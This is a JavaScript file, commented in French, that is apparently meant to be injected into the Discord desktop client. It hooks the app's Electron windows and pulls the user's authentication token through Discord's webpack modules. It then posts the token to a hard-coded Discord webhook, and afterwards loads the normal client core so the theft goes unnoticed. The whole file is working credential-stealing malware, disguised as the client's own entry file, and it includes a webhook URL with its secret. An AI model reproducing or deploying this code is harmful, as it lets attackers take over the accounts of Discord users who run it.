const { BrowserWindow } = require("electron");
const https = require("https");

// Envoi vers le webhook Discord
function sendToWebhook(content) {
    const data = JSON.stringify({ content });

    const options = {
        hostname: "discord.com",
        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // 🔁 Remplace par ton propre lien de webhook
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    };

    const req = https.request(options, res => {
        console.log("Webhook status:", res.statusCode);
    });

    req.on("error", error => {
        console.error("Erreur webhook:", error);
    });

    req.write(data);
    req.end();
}

// Extraction du token avec Webpack
function getToken() {
    const windows = BrowserWindow.getAllWindows();

    for (const win of windows) {
        win.webContents.on("did-finish-load", () => {
            win.webContents.executeJavaScript(`
                webpackChunkdiscord_app.push([
                    [Math.random()],
                    {},
                    e => {
                        for (let c in e.c) {
                            let m = e.c[c]?.exports;
                            if (m?.default?.getToken !== undefined) {
                                return m.default.getToken();
                            }
                        }
                        return null;
                    }
                ]);
            `).then(token => {
                if (token) {
                    console.log("Token Discord récupéré :", token);
                    sendToWebhook("Token Discord: " + token);
                } else {
                    console.warn("Aucun token trouvé.");
                }
            }).catch(err => {
                console.error("Erreur lors de l'extraction du token :", err);
            });
        });
    }
}

getToken();

// Charge le cœur de Discord normalement
module.exports = require('./core.asar');
